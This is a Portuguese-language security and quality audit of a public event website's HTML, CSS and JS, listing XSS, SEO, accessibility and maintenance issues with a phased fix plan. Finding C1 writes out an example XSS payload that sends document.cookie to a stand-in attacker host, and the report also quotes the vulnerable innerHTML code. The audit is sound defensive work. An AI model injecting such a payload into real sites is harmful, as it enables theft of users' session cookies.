# Auditoria Completa — Site Público SWDL

**Data:** 2026-09-17
**Escopo:** Todas as páginas HTML, CSS e JS em `pages/`
**Total de problemas:** 56 (6 críticos · 32 avisos · 18 informativos)

---

## Resumo Executivo

| Severidade | Quantidade |
|------------|------------|
| Crítico    | 6          |
| Aviso      | 32         |
| Informativo| 18         |

### Top 5 Prioridades

1. Sanitizar `crisis_message` — XSS em todas as páginas
2. Corrigir `sobre.html` — HTML quebrado + paths de imagem inconsistentes
3. Extrair CSS inline para arquivos externos
4. Adicionar meta descriptions em todas as páginas
5. Mover JS duplicado do crisis banner para `main.js`

---

## Problemas Críticos

### C1 — XSS via innerHTML no Crisis Banner

**Arquivos:** Todas as 10 páginas HTML
**Severidade:** Crítico (Segurança)

```javascript
// Código vulnerável (em todas as páginas)
textEl.innerHTML = `<strong>🚨 CRISE:</strong> ${data.crisis_message}`;
```

O `data.crisis_message` vem da API sem sanitização. Um atacante pode injetar:
```html
<script>document.location='https://evil.com/?c='+document.cookie</script>
```

**Correção:** Usar `textContent` ou criar função de sanitização HTML.

---

### C2 — Meta Description Ausente

**Arquivos:** comites.html, agenda.html, sobre.html, faca-parte.html, noticias.html, aviso-legal.html, privacidade.html, termos.html, 404.html

Só `index.html` possui `<meta name="description">`. Todas as outras páginas não têm.

**Impacto:** SEO prejudicado, resultados de busca mostram texto genérico.

---

### C3 — Meta Robots Ausente

**Arquivos:** Todas as páginas

- 404.html não tem `<meta name="robots" content="noindex, nofollow">`
- Nenhuma página tem referência a sitemap

**Impacto:** Página 404 pode ser indexada por buscadores.

---

### C4 — Open Graph / Twitter Card Ausente

**Arquivos:** Todas as páginas

Nenhuma página possui:
```html
<meta property="og:title" content="...">
<meta property="og:description" content="...">
<meta property="og:image" content="...">
<meta name="twitter:card" content="summary_large_image">
```

**Impacto:** Compartilhamento em redes sociais sem pré-visualização.

---

### C5 — HTML Quebrado em sobre.html

**Arquivo:** pages/sobre.html:341, 389
**Severidade:** Crítico (HTML inválido)

```html
<!-- ERRO: alt ausente e aspas faltando -->
<img src="assent/img/equipe/santiago.jpg"Guilherme Santiago">
```

**Correção:**
```html
<img src="assent/img/equipe/santiago.jpg" alt="Guilherme Santiago">
```

---

### C6 — Link Ancora Inexistente

**Arquivo:** pages/index.html:60

```html
<a href="#inscricao-strip">...</a>
```

A seção `#inscricao-strip` não existe no arquivo. O link não leva a lugar nenhum.

---

## Avisos Importantes

### A1 — CSS Inline Excessivo

| Arquivo | Linhas de CSS inline |
|---------|---------------------|
| agenda.html | ~300 |
| sobre.html | ~180 |
| faca-parte.html | ~40 |
| aviso-legal.html | ~40 |
| privacidade.html | ~80 |
| termos.html | ~70 |

**Correção:** Extrair para arquivos CSS externos.

---

### A2 — JS Duplicado (Crisis Banner)

**Arquivos:** Todas as 10 páginas HTML

Script de ~25 linhas copiado inline em cada página:
```javascript
async function loadCrisisBanner() {
    try {
        const res = await fetch(`${SWDL_API}/crisis`);
        const data = await res.json();
        if (data.active) {
            banner.classList.add('active');
            textEl.innerHTML = `...`;
        } else {
            banner.classList.remove('active');
        }
    } catch(e) {}
}
```

**Correção:** Mover para `main.js` e chamar uma única vez.

---

### A3 — _partials.html Não Utilizado

**Arquivo:** pages/_partials.html

O arquivo existe como template mas nunca é incluído. Cada página copia footer/nav inline com pequenas variações.

**Consequência:** Manutenção difícil — qualquer mudança precisa ser feita em 10+ arquivos.

---

### A4 — Footer Inconsistente

| Arquivo | Colunas no Footer |
|---------|-------------------|
| _partials.html | 4 colunas (Evento, Delegados, Org) |
| Páginas vivas | 3 colunas (Links Rápidos, Contato) |

O partial está desatualizado em relação ao que está em produção.

---

### A5 — Link "Notícias" Ausente no Footer

**Arquivos:** _partials.html:77, 404.html:244-248

O footer não inclui link para `noticias.html`.

---

### A6 — Email Hardcoded

**Arquivos:** Todas as páginas + i18n.js

`pedro.pereira63@portalsesisp.org.br` aparece ~9 vezes:
- No footer de cada página
- Nas traduções do i18n.js

**Correção:** Usar variável ou configuração centralizada.

---

### A7 — CSS/JS Não Minificados

**Arquivos:** css/ e js/

Nenhum arquivo tem versão minificada:
- `css/variables.css`
- `css/navbar.css`
- `css/pages.css`
- `css/home.css`
- `css/footer.css`
- `js/api.js`
- `js/main.js`
- `js/home.js`
- `js/i18n.js`

**Impacto:** Arquivos maiores = carregamento mais lento.

---

### A8 — XSS em home.js (Notícias)

**Arquivo:** js/home.js:37-69

```javascript
// Notícias injetadas sem sanitização
container.innerHTML += `
    <div class="news-card">
        <h3>${n.title}</h3>
        <p>${n.excerpt}</p>
        <span>${n.category}</span>
    </div>
`;
```

**Correção:** Usar `textContent` ou sanitizar antes de injetar.

---

### A9 — Campo errado no Formulário de Voluntários

**Arquivo:** pages/faca-parte.html:710

```javascript
motivation: fd.get('availability')  // ← campo errado
```

Deveria ser `fd.get('motivation')`.

---

### A10 — api.js Sem Timeout

**Arquivo:** js/api.js

Requisições fetch não têm timeout. Podem travar infinitamente se o servidor não responder.

```javascript
// Atual (sem timeout)
const res = await fetch(url, opts);

// Correção sugerida
const controller = new AbortController();
setTimeout(() => controller.abort(), 10000);
const res = await fetch(url, { ...opts, signal: controller.signal });
```

---

### A11 — i18n.js Incompleto

**Arquivo:** js/i18n.js (~1000+ linhas)

- 9 idiomas declarados no dropdown
- ~80% das chaves só têm traduções para `pt-BR` e `en`
- Arquivo único carrega todas as traduções de uma vez

**Correção:** Carregar traduções por demanda ou dividir por idioma.

---

### A12 — Google Fonts via @import

**Arquivo:** css/variables.css:6

```css
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
```

**Problema:** Render-blocking. O navegador bloqueia a renderização até baixar a fonte.

**Correção:** Usar `<link rel="preload">` no `<head>` do HTML.

---

### A13 — Navegação Ativa Frágil

**Arquivo:** js/main.js:20

```javascript
currentPage.includes(href.replace('.html', ''))
```

Pode causar falsos positivos (ex: "sobre" casa com "sobre-legal").

---

### A14 — Comentários HTML em Produção

**Arquivo:** pages/comites.html:137-166

Bloco de ~30 linhas comentado deixado no código de produção.

---

### A15 — Texto Desatualizado

**Arquivo:** pages/comites.html:198

Comitê "Misoginia" com `Edição de 2025` enquanto outros dizem `2026`.

---

## Informativos

### I1 — Canonical Link Ausente

Nenhuma página tem `<link rel="canonical" href="...">`.

---

### I2 — Theme Color Ausente

Nenhuma página tem `<meta name="theme-color" content="#...">` para navegadores mobile.

---

### I3 — Galeria sem Acessibilidade de Teclado

**Arquivo:** css/home.js / css/home.css:648-683

Acordeão da galeria não suporta navegação por Tab/Enter.

---

### I4 — news-nav-toggle Sem Label Acessível

**Arquivo:** pages/noticias.html:22

Botão tem `aria-label="Categorias"` mas duplica funcionalidade do hamburger.

---

### I5 — Empty Div

**Arquivo:** pages/index.html:203

```html
<div></div>
```

HTML morto sem conteúdo ou função.

---

### I6 — Inline Styles

**Arquivo:** pages/index.html:116-130

```html
<div class="stat-card" style="transition-delay:.1s">
```

Deveria usar classes CSS.

---

### I7 — <br> em Título

**Arquivo:** pages/index.html:199

```html
<h2 class="section-title"><br>Temas</h2>
```

Uso incomum de `<br>` em título.

---

### I8 — page-hero-bg-text Sem data-i18n

**Arquivo:** pages/sobre.html:211

Elemento não integrado ao sistema de tradução.

---

### I9 — 404.html Sem api.js

**Arquivo:** pages/404.html:273

Carrega `main.js` e `i18n.js` mas não `api.js`. Inconsistente com outras páginas.

---

### I10 — 404.html Com Logo Diferente

**Arquivo:** pages/404.html:162-163

Usa `nav-logo-badge` / `nav-logo-text` ao invés de `nav-logo-img` como as outras páginas.

---

### I11 — CSS Duplicado

| Classe | Arquivo 1 | Arquivo 2 |
|--------|-----------|-----------|
| `.ticker-bar` | variables.css:202 | pages.css:257 |
| `.filter-btn` | home.css:273 | pages.css:79 |

---

### I12 — nav-cta com !important Excessivo

**Arquivo:** css/navbar.css:87-98

4 ocorrências de `!important` que poderiam ser reescritas.

---

## Arquivos Analisados

| Arquivo | Tipo | Linhas |
|---------|------|--------|
| pages/index.html | HTML | ~350 |
| pages/noticias.html | HTML | ~250 |
| pages/comites.html | HTML | ~300 |
| pages/agenda.html | HTML | ~650 |
| pages/sobre.html | HTML | ~560 |
| pages/faca-parte.html | HTML | ~750 |
| pages/aviso-legal.html | HTML | ~100 |
| pages/privacidade.html | HTML | ~150 |
| pages/termos.html | HTML | ~140 |
| pages/404.html | HTML | ~290 |
| pages/_partials.html | HTML | ~100 |
| pages/css/variables.css | CSS | ~260 |
| pages/css/navbar.css | CSS | ~100 |
| pages/css/pages.css | CSS | ~340 |
| pages/css/home.css | CSS | ~680 |
| pages/css/footer.css | CSS | ~80 |
| pages/js/api.js | JS | ~50 |
| pages/js/main.js | JS | ~80 |
| pages/js/home.js | JS | ~300 |
| pages/js/i18n.js | JS | ~1000+ |

---

## Plano de Correção Sugerido

### Fase 1 — Segurança (Imediato)
- [ ] C1: Sanitizar crisis_message em todas as páginas
- [ ] A8: Sanitizar notícias em home.js
- [ ] A9: Corrigir campo motivation no formulário

### Fase 2 — HTML/SEO (Curto prazo)
- [ ] C5: Corrigir HTML quebrado em sobre.html
- [ ] C6: Remover ou corrigir link #inscricao-strip
- [ ] C2: Adicionar meta descriptions
- [ ] C3: Adicionar meta robots no 404
- [ ] C4: Adicionar Open Graph tags

### Fase 3 — Manutenção (Médio prazo)
- [ ] A2: Mover crisis banner para main.js
- [ ] A3: Decidir sobre _partials.html (usar ou remover)
- [ ] A4/A5: Unificar footer
- [ ] A6: Centralizar email
- [ ] A14: Remover comentáriosHTML
- [ ] A15: Atualizar data Misoginia

### Fase 4 — Performance (Médio prazo)
- [ ] A1: Extrair CSS inline
- [ ] A7: Minificar CSS/JS
- [ ] A12: Trocar @import por <link preload>
- [ ] A10: Adicionar timeout em api.js

### Fase 5 — Qualidade (Longo prazo)
- [ ] A11: Completar traduções i18n
- [ ] A13: Melhorar detecção de navegação ativa
- [ ] I3: Adicionar acessibilidade de teclado na galeria
- [ ] I1: Adicionar canonical links
- [ ] I2: Adicionar theme-color
